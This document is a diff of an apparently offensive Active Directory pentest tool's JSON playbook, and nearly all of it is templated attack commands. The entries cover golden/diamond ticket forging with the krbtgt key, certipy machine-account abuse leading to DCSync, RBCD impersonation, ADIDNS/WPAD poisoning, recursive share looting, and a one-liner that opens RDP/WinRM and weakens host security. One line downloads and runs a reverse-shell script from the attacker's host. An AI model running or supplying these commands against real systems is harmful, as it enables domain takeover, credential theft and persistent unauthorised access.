+          "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution",
           "note": "Grab an actual desktop first. Favor RDP over WinRM for enumeration, WinRM runs into the Kerberos double-hop problem (your session cannot re-authenticate to the DC for certain queries). /cert:ignore suppresses prompts."
         },
         {
@@ -3273,7 +3490,9 @@
         "access.desktop"
       ],
       "deprioritize_when": [
-        "loot.ntds"
+        "loot.ntds",
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "ad.user_list",
@@ -3341,13 +3560,18 @@
       "requires_any": [
         "ad.attack_paths",
         "ad.acl_lead",
-        "ad.control_paths"
+        "ad.acl_paths"
       ],
       "obsoleted_by": [
         "loot.ntds"
       ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
       "produces": [
         "ad.control_paths",
+        "ad.domain_control",
         "credential.candidate"
       ],
       "priority": 92,
@@ -3693,8 +3917,13 @@
       "commands": [
         {
           "tool": "rubeus",
-          "run": "Rubeus.exe diamond /krbkey:{{nthash}} /user:{{user}} /password:{{password}} /enctype:aes /ticketuser:administrator /domain:{{domain}} /dc:{{dc}}",
+          "run": "Rubeus.exe diamond /krbkey:{{krbtgt_hash}} /user:{{user}} /password:{{password}} /enctype:aes /ticketuser:administrator /domain:{{domain}} /dc:{{dc}}",
           "note": "Request a real TGT, then re-sign it as administrator with the krbtgt (AES) key. /krbkey is the krbtgt hash. Prefer this over golden for stealth."
+        },
+        {
+          "tool": "impacket-ticketer",
+          "run": "impacket-ticketer -aesKey {{krbtgt_aes256}} -domain-sid {{domain_sid}} -domain {{domain}} -user-id 500 -groups 512,513,518,519,520 administrator",
+          "note": "Kali alternative: forge an AES-signed TGT with the krbtgt AES-256 key and explicit group RIDs so it blends in with modern Kerberos encryption defaults."
         }
       ]
     },
@@ -3862,7 +4091,8 @@
       ],
       "requires_all": [],
       "requires_any": [
-        "smb.ms17_010"
+        "smb.ms17_010",
+        "smb.smbv1"
       ],
       "produces": [
         "foothold.windows",
@@ -4081,7 +4311,8 @@
         "windows"
       ],
       "requires_any": [
-        "sccm.enumerated"
+        "sccm.enumerated",
+        "ad.sccm_candidates"
       ],
       "produces": [
         "credential.candidate",
@@ -4168,17 +4399,17 @@
         },
         {
           "tool": "certipy",
-          "run": "certipy account create -u '{{user}}'@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns {{dc_fqdn}}",
+          "run": "certipy account create -u '{{user}}'@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -pass '{{newpass|Passw0rd123!}}' -dns {{dc_fqdn}}",
           "note": "Create a machine account whose dNSHostName matches a DC; that name is what the CA maps the certificate to."
         },
         {
           "tool": "certipy",
-          "run": "certipy req -u 'evilpc$'@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca {{ca_name}} -template Machine",
+          "run": "certipy req -u 'evilpc$'@{{domain}} -p '{{newpass|Passw0rd123!}}' -dc-ip {{target}} -ca {{ca_name}} -template Machine",
           "note": "The CA maps the issued certificate to the DC name; certipy auth -pfx then returns the DC NT hash."
         },
         {
           "tool": "secretsdump",
-          "run": "secretsdump.py -hashes :{{nthash}} '{{domain}}/dc01$@{{target}}' -just-dc-user krbtgt",
+          "run": "secretsdump.py -hashes :{{nthash}} '{{domain}}/{{dc_account|dc01$}}@{{target}}' -just-dc-user krbtgt",
           "note": "With the DC hash you DCSync the domain; krbtgt means a golden ticket and permanent control."
         }
       ],
@@ -4198,7 +4429,7 @@
       "tools": [
         "krbrelayx",
         "coercer",
-        "certipy"
+        "impacket"
       ],
       "os": [
         "windows"
@@ -4240,8 +4471,8 @@
           "note": "Coerce the victim to authenticate with Kerberos to a name that resolves to your relay."
         },
         {
-          "tool": "certipy",
-          "run": "getST.py -spn cifs/{{victim_fqdn}} -impersonate administrator 'acme.internal/evilpc$:{{password}}'",
+          "tool": "impacket",
+          "run": "getST.py -spn cifs/{{victim_fqdn}} -impersonate administrator '{{domain}}/{{attacker_computer|evilpc$}}:{{newpass|Passw0rd123!}}'",
           "note": "With RBCD written, request a ticket impersonating Administrator to the victim: SYSTEM on that host."
         }
       ],
@@ -4357,12 +4588,12 @@
         },
         {
           "tool": "dnstool",
-          "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+          "run": "dnstool.py -u '{{domain}}\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
           "note": "A wildcard answers every name without an explicit record; allow a few minutes to replicate."
         },
         {
           "tool": "dnstool",
-          "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
+          "run": "dnstool.py -u '{{domain}}\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
           "note": "WPAD turns on proxy auto-discovery pointed at you; often GPO-blocked, so the wildcard is more reliable."
         },
         {
@@ -4417,7 +4648,12 @@
         {
           "tool": "smbclient",
           "run": "smbclient '//{{target}}/{{share}}' -N",
-          "note": "PREFERRED (Anonymous/Null session interactive): Connect directly to the discovered share. Type 'help' for commands, 'ls' to list, 'cd' to navigate, and 'get filename' to download."
+          "web": "smbclient '//{{target}}/{{share}}' -N -c 'prompt OFF; recurse ON; mget *'",
+          "settled_by": [
+            "loot.files",
+            "credential.available"
+          ],
+          "note": "PREFERRED (Anonymous/Null session): Recursively downloads all readable files from the discovered share into your current working directory so you can inspect configs or grep for GPP Groups.xml."
         },
         {
           "tool": "smbclient",
@@ -4427,6 +4663,10 @@
         {
           "tool": "smbclient",
           "run": "smbclient '//{{target}}/{{share}}' -N -c 'prompt OFF; recurse ON; mget *'",
+          "settled_by": [
+            "loot.files",
+            "credential.available"
+          ],
           "note": "RECURSIVE DUMP (Anonymous): Downloads the entire share structure into your current working directory. Ideal for dumping Replication or SYSVOL shares to grep for GPP Groups.xml."
         },
         {
@@ -4456,7 +4696,9 @@
         "impacket-wmiexec",
         "impacket-psexec",
         "evil-winrm",
+        "xfreerdp",
         "impacket-smbexec",
+        "nxc",
         "nc"
       ],
       "os": [
@@ -4466,9 +4708,22 @@
       "requires_any": [
         "access.admin",
         "credential.available",
+        "credential.password",
+        "credential.plaintext",
         "winrm.authenticated",
-        "hash.ntlm"
+        "hash.ntlm",
+        "host.rdp_enabled",
+        "host.winrm_enabled",
+        "ad.gpo_control"
       ],
+      "credential_probe": {
+        "users": [
+          "administrator"
+        ],
+        "methods": [
+          "dcsync"
+        ]
+      },
       "produces": [
         "access.shell",
         "foothold.windows"
@@ -4491,7 +4746,8 @@
           "locus": "onhost",
           "requires_port": 5985,
           "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
-          "note": "PORT 5985 WinRM SHELL (Recommended when port 5985 is open): Fast, full interactive PowerShell remoting shell. Works for standard domain users with remote management rights without requiring local Administrator privileges."
+          "note": "PORT 5985 WinRM SHELL (Recommended when port 5985 is open or enabled): Fast, full interactive PowerShell remoting shell. Works for standard domain users with remote management rights without requiring local Administrator privileges.",
+          "web_note": "WINRM INTERACTIVE SHELL (Port 5985): Connect directly to an interactive PowerShell session."
         },
         {
           "tool": "evil-winrm",
@@ -4501,11 +4757,20 @@
           "note": "PORT 5985 WinRM PASS-THE-HASH: Full interactive PowerShell remoting shell using a captured NT hash."
         },
         {
+          "tool": "xfreerdp",
+          "locus": "onhost",
+          "requires_port": 3389,
+          "run": "xfreerdp /v:{{target}} /u:'{{user}}' /p:'{{password}}' /d:{{domain}} /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution",
+          "note": "PORT 3389 RDP INTERACTIVE DESKTOP (When port 3389 is open or enabled): Launch a full interactive RDP desktop session on the target host.",
+          "web_note": "RDP INTERACTIVE DESKTOP (Port 3389): Launch a full graphical RDP desktop session."
+        },
+        {
           "tool": "impacket-wmiexec",
           "locus": "onhost",
           "requires_admin": true,
           "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
-          "note": "PORT 135/445 WMI SHELL: Spawns a semi-interactive C:\\> prompt using WMI and SMB output. Reliable on Windows Server 2008 R2 through Server 2022, especially when WinRM (5985) is closed or disabled. Requires administrative privileges."
+          "note": "PORT 135/445 WMI SHELL: Spawns a semi-interactive C:\\> prompt using WMI and SMB output. Reliable on Windows Server 2008 R2 through Server 2022, especially when WinRM (5985) is closed or disabled. Requires administrative privileges.",
+          "web_note": "PORT 135/445 WMI SHELL (When WinRM 5985 is closed): Spawns a semi-interactive C:\\> prompt over WMI and SMB."
         },
         {
           "tool": "impacket-psexec",
@@ -4522,20 +4787,39 @@
           "note": "STEALTHIER SMB SHELL: Communicates over port 445 without leaving a service binary on disk. Requires administrative privileges."
         },
         {
+          "tool": "nxc",
+          "locus": "onhost",
+          "requires_admin": true,
+          "settled_by": [
+            "host.rdp_enabled",
+            "host.winrm_enabled",
+            "access.admin_shell",
+            "access.shell"
+          ],
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x '(net localgroup \"Remote Desktop Users\" \"{{user}}\" /add & net localgroup \"Remote Management Users\" \"{{user}}\" /add & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & sc config TermService start= auto & net start TermService & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv6Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=\"WinRM-HTTP\" dir=in localport=5985 protocol=TCP action=allow & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'",
+          "note": "ENABLE RDP & WINRM REMOTELY: Adds your account to Remote Desktop Users and Remote Management Users and enables RDP (3389) and WinRM (5985) on the host. Paste output to unlock xfreerdp and evil-winrm.",
+          "web_note": "WANT RDP OR WINRM? Run this one-liner from Kali to enable RDP (3389) and WinRM (5985) and add your user to Remote Desktop Users & Remote Management Users, then paste output back to unlock xfreerdp and evil-winrm.",
+          "alt": true
+        },
+        {
           "tool": "nc",
           "locus": "onhost",
+          "requires_admin": true,
           "run": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{web_port}}/Invoke-PowerShellTcp.ps1')\"",
           "note": "REVERSE SHELL UPGRADE: Execute this inside your wmiexec or psexec prompt to catch a full interactive reverse shell back to your Kali netcat listener (`nc -lvnp {{lport}}`)."
         },
         {
           "tool": "evil-winrm",
           "locus": "onhost",
+          "requires_port": 5985,
           "run": "evil-winrm -i {{target}} -c {{cert_file}} -k {{key_file}} -S",
           "note": "WinRM certificate authentication (SSL): Log in using an extracted client certificate (.crt) and decrypted private key (.key) without a user password over WinRM SSL port 5986 (or 5985 with -S)."
         }
       ],
       "deprioritize_when": [
-        "foothold.windows"
+        "access.shell",
+        "access.admin_shell",
+        "access.desktop"
       ]
     },
     {
@@ -4639,6 +4923,119 @@
       "deprioritize_when": [
         "access.admin",
         "access.system"
+      ]
+    },
+    {
+      "id": "rpc-endpoint-abuse",
+      "title": "RPC Endpoint & Named Pipe Coercion / Service Triage (MS-RPRN / MS-EFSR / ATSVC)",
+      "hypothesis": "RPC endpoint mapping (impacket-rpcdump / port 135) revealed exposed MSRPC interfaces and named pipes. Specific UUIDs directly map to attack surfaces: MS-RPRN (spoolss) enables PrintNightmare/PrinterBug, MS-EFSR (efsrpc/lsarpc) enables PetitPotam coercion, and ATSVC/ITaskSchedulerService exposes remote task execution.",
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "rpcclient"
+      ],
+      "os": [
+        "windows"
+      ],
+      "diagnostic": true,
+      "phase": "enum",
+      "requires_all": [],
+      "requires_any": [
+        "rpc.endpoints"
+      ],
+      "produces": [
+        "ad.coerced_auth",
+        "ad.user_list"
+      ],
+      "settled_by": [
+        "ad.coerced_auth",
+        "ad.user_list"
+      ],
+      "obsoleted_by": [
+        "loot.ntds",
+        "access.system"
+      ],
+      "deprioritize_when": [
+        "loot.ntds",
+        "access.admin",
+        "access.system"
+      ],
+      "priority": 76,
+      "proves": "which discovered RPC interfaces (Print Spooler, EfsRpc, WebDAV, SAMR) are actively abusable for authentication coercion or user enumeration",
+      "does_not_prove": "remote code execution or domain control until a coerced authentication is relayed or a credential is recovered",
+      "report": {
+        "finding": "Exposed MSRPC Interfaces and Named Pipes (MS-RPRN / MS-EFSR / SAMR)",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '{{user|}}' -p '{{password|}}' -M spooler -M coerce_plus -M webdav",
+          "note": "Check whether the exposed RPC endpoints correspond to live Print Spooler (MS-RPRN), PetitPotam/EFSRPC (coerce_plus), or WebClient coercion surfaces."
+        },
+        {
+          "tool": "rpcclient",
+          "run": "rpcclient -U '{{user|}}%{{password|}}' {{target}} -c 'srvinfo; enumdomusers; querydominfo'",
+          "note": "Query the SAMR and SRVSVC RPC pipes directly to enumerate domain users and server metadata."
+        }
+      ]
+    },
+    {
+      "id": "fix-samr-null-denied",
+      "title": "Anonymous SAMR Denied: Pivot to Kerbrute / Anonymous LDAP User Enumeration",
+      "hypothesis": "Windows Server 2016+ and hardened Domain Controllers restrict anonymous SAMR access (RestrictAnonymousSAM=1), causing rpcclient enumdomusers and nxc --rid-brute over null sessions to return NT_STATUS_ACCESS_DENIED. Bypass SAMR restrictions by enumerating users via Kerberos AS-REQ pre-auth oracle (kerbrute on port 88) or anonymous LDAP RootDSE/namingContexts queries (port 389).",
+      "tool": "kerbrute",
+      "tools": [
+        "kerbrute",
+        "ldapsearch"
+      ],
+      "os": [
+        "windows"
+      ],
+      "phase": "enum",
+      "requires_all": [
+        "blocker.samr_null_denied"
+      ],
+      "requires_any": [],
+      "produces": [
+        "ad.user_list"
+      ],
+      "settled_by": [
+        "ad.user_list",
+        "credential.available"
+      ],
+      "obsoleted_by": [
+        "ad.user_list",
+        "credential.available"
+      ],
+      "deprioritize_when": [
+        "ad.user_list",
+        "credential.available"
+      ],
+      "priority": 86,
+      "proves": "valid domain usernames via Kerberos AS-REQ oracle or anonymous LDAP when anonymous SAMR RPC is blocked",
+      "does_not_prove": "a password or authenticated session; enumerated usernames feed AS-REP roasting and password spraying",
+      "report": {
+        "finding": "Anonymous SAMR Restricted; User Enumeration via Kerberos/LDAP",
+        "severity": "info"
+      },
+      "refs": [
+        "https://github.com/ropnop/kerbrute"
+      ],
+      "commands": [
+        {
+          "tool": "kerbrute",
+          "run": "kerbrute userenum --dc {{target}} -d {{domain}} {{userlist}}",
+          "note": "Bypass blocked SAMR null sessions by validating usernames against the Kerberos KDC (TCP/UDP 88), which answers without SMB/RPC access."
+        },
+        {
+          "tool": "ldapsearch",
+          "run": "ldapsearch -x -H ldap://{{target}} -b '{{basedn}}' '(objectClass=user)' sAMAccountName description",
+          "note": "Attempt an anonymous LDAP query on port 389; some DCs block anonymous SAMR while leaving anonymous LDAP read enabled."
+        }
       ]
     }
   ]
